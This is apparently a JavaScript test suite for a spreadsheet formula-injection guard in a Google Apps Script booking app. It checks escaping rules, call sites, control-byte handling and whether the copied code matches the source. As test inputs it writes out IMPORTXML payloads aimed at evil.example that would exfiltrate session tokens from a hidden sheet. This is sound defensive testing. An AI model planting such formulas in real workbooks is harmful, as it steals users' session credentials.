// Free text written to a sheet must not become a formula.
//
// A cell whose text starts with = or + is stored by Sheets as a FORMULA, not a
// label — setValue("=…") from Apps Script creates a live one. So a 備考 or a
// building name of
//
//   =IMPORTXML("https://evil.example/?d="&Sessions!A2,"//a")
//
// runs the next time anybody opens the workbook, reading the HIDDEN Sessions
// sheet in that same spreadsheet and posting a valid session token out. Nothing
// looks wrong inside the app, because every read goes through getDisplayValues(),
// which returns the formula's RESULT rather than its text.
//
// Two guards, deliberately with DIFFERENT character sets:
//   _cellSafe_   (Code.js)    — Sheets. Only = and + are formula starters there.
//   _expCsv's esc (Index.html) — Excel, via an exported CSV. Also - and @.
// Widening the sheet-side set would turn ordinary values like -5 into text for
// no gain; narrowing the CSV set would leave the export executable.

const fs = require('fs');
const path = require('path');
const ROOT = path.join(__dirname, '..');
const CODE = fs.readFileSync(path.join(ROOT, 'Code.js'), 'utf8');
const HTML = fs.readFileSync(path.join(ROOT, 'Index.html'), 'utf8');

let pass = 0, fail = 0;
function check(n, c, d) {
  if (c) { pass++; console.log("  PASS  " + n); }
  else { fail++; console.log("  FAIL  " + n + "\n        " + d); }
}

// ---- transcribed from Code.js ----------------------------------------------
function _cellSafe_(v) {
  if (typeof v !== "string") return v;
  const s = v.replace(/^[\s\x00-\x1f]+/, "");
  if (/^[=+]/.test(s)) return "'" + v;
  if (/^-/.test(s) && !/^-?\d+(\.\d+)?$/.test(s)) return "'" + v;
  return v;
}
function _cellSafeRow_(arr) { return arr.map(_cellSafe_); }

console.log("\n1. formula starters are neutralised");
{
  const ATTACKS = [
    '=IMPORTXML("https://evil.example/?d="&Sessions!A2,"//a")',
    '=1+1',
    '+1+1',
    '=HYPERLINK("https://evil.example","click")',
    '=CONCATENATE(Sessions!A2)'
  ];
  ATTACKS.forEach(function (a) {
    check("neutralises " + a.substring(0, 34), _cellSafe_(a) === "'" + a, "got: " + _cellSafe_(a));
  });

  // ⚠️ Leading whitespace does not stop Sheets reading the = that follows, so the
  // check has to look past it. A guard that only tested charAt(0) would miss this.
  check("leading space does not evade it", _cellSafe_("  =1+1") === "'  =1+1", _cellSafe_("  =1+1"));
  check("leading tab does not evade it", _cellSafe_("\t=1+1") === "'\t=1+1", JSON.stringify(_cellSafe_("\t=1+1")));
  check("leading newline does not evade it", _cellSafe_("\n=1+1") === "'\n=1+1", JSON.stringify(_cellSafe_("\n=1+1")));
  // ⚠️ This check shipped in f06b233 and PASSED for months without the guard existing:
  // the transcription above had drifted to [\s -], which strips a literal hyphen, so the
  // suite was exercising a different function than the one that ships. Closed 2026-09-07.
  check("a leading dash before the = does not evade it",
    _cellSafe_("-=1+1") === "'-=1+1", _cellSafe_("-=1+1"));
  // ⚠️ THE shape that matters, and the one a strip-and-retest fix would have missed:
  // after stripping the -, this begins with I, not =. Sheets evaluates it and runs the
  // fetch exactly as the = form does.
  check("⚠️ a dash before a FUNCTION NAME does not evade it either",
    _cellSafe_('-IMPORTXML("https://evil.example/?d="&Sessions!A2,"//a")')[0] === "'",
    "a guard that only catches -= closes the test case and leaves the exploit open");
  check("...nor a doubled dash, a space after it, or another function",
    _cellSafe_("--=1+1")[0] === "'" && _cellSafe_("- =1+1")[0] === "'"
      && _cellSafe_('-HYPERLINK("https://evil.example","x")')[0] === "'", "");
}

console.log("\n2. ordinary data is left exactly alone");
{
  // ⚠️ The guard is worthless if it corrupts real values — identity-by-name is
  // this app's worst bug class (§9.1), and a stray apostrophe on a building name
  // would break every lookup that plainly should work.
  const SAFE = ['さくら寮', 'Sakura Building', 'A-101', '2026年4月', '',
                'student@example.com', '@handle', '-5', '-5.25', '0123',
                'https://meet.google.com/abc', '１０１号室'];
  SAFE.forEach(function (s) {
    check("untouched: " + JSON.stringify(s), _cellSafe_(s) === s, "got: " + _cellSafe_(s));
  });

  // @ is NOT a formula starter in Sheets; it is guarded in the CSV export instead,
  // where Excel is the risk. See section 6.
  check("a leading @ is not prefixed", _cellSafe_("@x") === "@x", "");
  // ⚠️ The exemption that stops the dash guard corrupting real data. It is a whitelist
  // of ONE shape — a bare number — because a guard has to fail closed.
  check("a bare negative number is exempt, so -5 stays a number",
    _cellSafe_("-5") === "-5" && _cellSafe_("-5.25") === "-5.25" && _cellSafe_("-0") === "-0",
    "prefixing it would make an ordinary negative into a text cell");
  // ⚠️ 2026-09-07: '-3人' USED to be on the SAFE list above. It no longer is, and that is
  // the ONE behaviour change from closing the dash gap. Sheets would try to evaluate it,
  // so text is the right storage — and the apostrophe is Sheets' own text marker, not part
  // of the value: reads give back '-3人' either way, so every lookup in the app is
  // unaffected. See the header note at the top of this file.
  check("⚠️ a non-numeric value starting with - is now stored as text",
    _cellSafe_("-3人") === "'-3人",
    "what the widening bought: fail closed on anything not provably a number");
}

console.log("\n3. non-strings pass through unchanged");
{
  // ⚠️ Dates must stay Dates and counts must stay numbers. Stringifying them here
  // would be §9.3's leading-zero coercion bug in reverse — a Timestamp column
  // full of text, and no error anywhere.
  const d = new Date(2026, 7, 19);
  check("a Date survives as the same object", _cellSafe_(d) === d, "");
  check("a number survives as a number", _cellSafe_(0) === 0 && _cellSafe_(-5) === -5, "");
  check("null and undefined pass through",
    _cellSafe_(null) === null && _cellSafe_(undefined) === undefined, "");
  check("a boolean passes through", _cellSafe_(false) === false, "");
}

console.log("\n4. _cellSafeRow_ preserves the positional contract");
{
  // ⚠️ THE REASON the guard wraps the array instead of editing fields inside it.
  // Positional read/write maps are this app's worst silent-corruption class
  // (§8.3): a row that changes length or order writes every later column into the
  // wrong cell, with no error. map() cannot do that; hand-editing fields can.
  const d = new Date(2026, 7, 19);
  const row = [d, "=1+1", "", 5, null, "さくら寮", false];
  const out = _cellSafeRow_(row);
  check("length is identical", out.length === row.length, out.length + " vs " + row.length);
  check("only the dangerous cell changed",
    out[0] === d && out[1] === "'=1+1" && out[2] === "" && out[3] === 5 &&
    out[4] === null && out[5] === "さくら寮" && out[6] === false,
    JSON.stringify(out));
  check("the input array is not mutated", row[1] === "=1+1",
    "map returns a new array; mutating in place would surprise a caller that reuses it");
  check("an empty row stays empty", _cellSafeRow_([]).length === 0, "");
}

console.log("\n5. the write sites actually use it");
{
  check("_cellSafe_ and _cellSafeRow_ exist",
    /function _cellSafe_\(v\) \{/.test(CODE) && /function _cellSafeRow_\(arr\) \{/.test(CODE), "");

  // The audit log is the single highest-value site: 51 call sites feed it, its
  // target/details are built from user input, and Activity_Log is read by a human.
  const la = CODE.indexOf('function _logActivity_');
  const laBody = CODE.slice(la, CODE.indexOf('\n}', la));
  check("_logActivity_ writes through the guard",
    /log\.appendRow\(_cellSafeRow_\(\[/.test(laBody),
    "51 call sites lose the guard at once if this one regresses");

  const SITES = [
    ['the booking status/student block', /getRange\(r, 6, 1, 7\)\.setValues\(\[_cellSafeRow_\(/],
    ['the cancel-reason/備考 block', /getRange\(r, 23, 1, 3\)\.setValues\(\[_cellSafeRow_\(/],
    ['a newly appended booking row', /sSheet\.appendRow\(_cellSafeRow_\(\[new Date\(\), u\.teacherId/],
    ['the reassign append', /sSheet\.appendRow\(_cellSafeRow_\(\[new Date\(\), toTeacherId/],
    ['the 日時変更 request block', /getRange\(found\.rowIndex, 17, 1, 5\)\.setValues\(\[_cellSafeRow_\(/],
    ['the announcement body', /sh\.appendRow\(_cellSafeRow_\(\[id, new Date\(\)/],
    ['the new-building row', /sheet\.appendRow\(_cellSafeRow_\(\[\s*\n\s*formObject\.bldgId/],
    ['the updated-building row', /setValues\(\[_cellSafeRow_\(existingRow\)\]\)/],
    ['the new-room row', /roomSheet\.appendRow\(_cellSafeRow_\(\[/],
    ['the updated-room row', /getRange\(rowIndex, 2, 1, 20\)\.setValues\(\[_cellSafeRow_\(/],
    ['the role label', /getRange\(found, 2, 1, 5\)\.setValues\(\[_cellSafeRow_\(\[lab/],
    // ⚠️ saveSystemUser — admin-typed name/email/permissions reach Staff_Master and
    // Teacher_Master. Unguarded until 2026-09-11, when it was the last open write site.
    ['a user edit: ID + name', /getRange\(rowIndex, 1, 1, 2\)\.setValues\(\[_cellSafeRow_\(\[u\.id, u\.name\]\)\]\)/],
    ['a user edit: email/notif/perms', /getRange\(rowIndex, 4, 1, 3\)\.setValues\(\[_cellSafeRow_\(\[u\.email,/],
    ['a new user row', /sheet\.appendRow\(_cellSafeRow_\(\[u\.id, u\.name, "", u\.email,/]
  ];
  SITES.forEach(function (s) {
    check(s[0] + " is guarded", s[1].test(CODE),
      "the wrapper was removed or the write was rewritten — re-apply _cellSafeRow_");
  });

  const n = (CODE.match(/_cellSafeRow_\(/g) || []).length - 1;   // minus the definition
  check("the guard is applied broadly", n >= 12,
    "only " + n + " call sites — sites were dropped");
}

console.log("\n6. the CSV export guards the wider Excel set");
{
  // Transcribed from _expCsv. Excel treats =, +, - and @ as formula starters in a
  // CSV field; CSV quoting does nothing about that.
  const esc = function (v) {
    let s = String(v == null ? "" : v);
    if (/^[=+\-@]/.test(s) && !/^-?\d+(\.\d+)?$/.test(s)) s = "'" + s;
    return /[",\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
  };

  check("=1+1 is neutralised", esc("=1+1") === "'=1+1", esc("=1+1"));
  check("+1 is neutralised", esc("+1") === "'+1", esc("+1"));
  check("@SUM is neutralised", esc("@SUM(A1)") === "'@SUM(A1)", esc("@SUM(A1)"));
  check("-foo is neutralised", esc("-foo") === "'-foo", esc("-foo"));

  // ⚠️ The numeric exemption. Without it every negative number in an export
  // becomes text in Excel, which breaks the spreadsheets people build on these.
  check("-5 stays a number", esc("-5") === "-5", esc("-5"));
  check("-5.25 stays a number", esc("-5.25") === "-5.25", esc("-5.25"));
  check("ordinary text is untouched", esc("さくら寮") === "さくら寮", "");

  // Quoting still has to happen, and must happen AFTER the prefix or the
  // apostrophe lands outside the quotes.
  check("a comma is still quoted", esc("a,b") === '"a,b"', esc("a,b"));
  check("a quote is still doubled", esc('a"b') === '"a""b"', esc('a"b'));
  check("a dangerous value with a comma is prefixed inside the quotes",
    esc("=a,b") === "\"'=a,b\"", esc("=a,b"));

  check("_expCsv carries the guard in source",
    /if \(\/\^\[=\+\\-@\]\/\.test\(s\) && !\/\^-\?\\d\+\(\\\.\\d\+\)\?\$\/\.test\(s\)\) s = "'" \+ s;/.test(HTML),
    "the transcription above is meaningless if the real export dropped it");
}

console.log("\n7. ⚠️ the guard strips CONTROL characters, and the source says so in escapes");
{
  // ⚠️ WHY THIS SECTION EXISTS. Code.js held the two ends of this range as RAW BYTES —
  // /^[\s<NUL>-<US>]+/ — instead of \x00 and \x1f. It parsed, and it meant exactly the
  // right thing, so nothing ever failed. What it broke was every tool that READS the
  // file: `file` called Code.js "data", and grep SKIPPED IT ENTIRELY, exiting 1 with no
  // warning — indistinguishable from "no matches". Searches for functions that plainly
  // exist came back empty for months.
  //
  // ⚠️ And it cost this suite its own correctness. The transcription above was copied out
  // of a terminal that swallowed the two invisible bytes, and came out as [\s -] —
  // whitespace, space, and a literal HYPHEN. So this file tested a guard that strips
  // leading hyphens, which the real one deliberately does not, and never once tested a
  // control character, which is the entire reason the range is there.
  //
  // Both halves are pinned below: the escapes must stay escapes, and the behaviour the
  // range exists for must actually be exercised.

  const NUL = String.fromCharCode(0), US = String.fromCharCode(31), SOH = String.fromCharCode(1);

  check("a control character before = does not hide the formula",
    _cellSafe_(NUL + '=IMPORTXML("x")')[0] === "'"
      && _cellSafe_(US + "=A1")[0] === "'"
      && _cellSafe_(SOH + "+A1")[0] === "'",
    "stripping these before the test is the whole point of the range");
  check("...mixed with ordinary whitespace too",
    _cellSafe_(" " + NUL + "\t=A1")[0] === "'", "");
  // ⚠️ The strip set must NOT gain a hyphen, even though - is now guarded. Stripping it
  // and re-testing for = catches -=A1 and misses -IMPORTXML(…) — which is precisely the
  // half-fix this guard was nearly shipped as. The dash has its own rule, with the
  // bare-number exemption; the strip set stays whitespace and control characters.
  check("⚠️ the strip set is whitespace and control characters ONLY",
    /v\.replace\(\/\^\[\\s\\x00-\\x1f\]\+\/, ""\)/.test(CODE)
      && !/replace\(\/\^\[[^\]]*-\][^)]*\)/.test(CODE.replace('\\x00-\\x1f', 'RANGE')),
    "a hyphen here turns the dash guard back into a -= -only half-fix");
  check("...and a control character with no formula behind it is untouched",
    _cellSafe_(NUL + "notes") === NUL + "notes", "");

  check("the source writes the range as \\x00-\\x1f, not as raw bytes",
    /v\.replace\(\/\^\[\\s\\x00-\\x1f\]\+\/, ""\)/.test(CODE),
    "raw control bytes parse and behave, but make grep skip the whole file in silence");
  // ⚠️ The real regression guard. Nothing here is worth much if the bytes come back.
  const RAW = /[\x00-\x08\x0b\x0c\x0e-\x1f]/;
  check("⚠️ neither source file carries a stray control byte at all",
    !RAW.test(CODE) && !RAW.test(HTML),
    "`file` reports such a file as data; grep then returns nothing, exit 1, no warning");
}

console.log("\n8. ⚠️ the transcription is bound to the source");
{
  // ⚠️ WHY. Everything above this point exercises the TRANSCRIPTION at the top of the
  // file — a hand-typed copy of _cellSafe_. Measured 2026-09-07: with only §5's call-site
  // checks in place, Code.js could lose its = / + rule ENTIRELY and all 65 checks still
  // passed. A transcription with no binding is a test of the copy, not of the code, and
  // that is exactly how [\s -] survived here for months while the real guard read
  // [\s\x00-\x1f].
  //
  // These use indexOf on the literal source text rather than regexes: escaping a regex
  // that contains a regex is how a binding ends up matching nothing and passing forever.
  const cs = CODE.slice(CODE.indexOf('function _cellSafe_(v) {'),
                        CODE.indexOf('function _cellSafeRow_('));
  check("the source slice was actually found",
    cs.length > 100 && cs.indexOf('return v;') !== -1,
    "an empty slice makes every check below vacuously true");
  check("non-strings still pass through in the source",
    cs.indexOf('if (typeof v !== "string") return v;') !== -1,
    "a Date must stay a Date");
  check("the = / + rule is in the SOURCE, not only in the transcription",
    cs.indexOf('if (/^[=+]/.test(s)) return "\'" + v;') !== -1,
    "this is the original guard — losing it is the whole formula-injection hole");
  check("the dash rule is in the SOURCE",
    cs.indexOf('if (/^-/.test(s)') !== -1,
    "-IMPORTXML(…) executes in Sheets exactly as the = form does");
  check("...with its bare-number exemption intact",
    cs.indexOf('!/^-?\\d+(\\.\\d+)?$/.test(s)') !== -1,
    "without it every -5 becomes a text cell; widened, -IMPORTXML slips through");
  check("...and the exemption is anchored at both ends",
    cs.indexOf('/^-?\\d+(\\.\\d+)?$/') !== -1,
    "an unanchored number test matches -5abc and exempts it");
}

console.log("\n" + (fail === 0 ? "ALL " + pass + " CHECKS PASSED" : pass + " passed, " + fail + " FAILED"));
process.exitCode = fail === 0 ? 0 : 1;
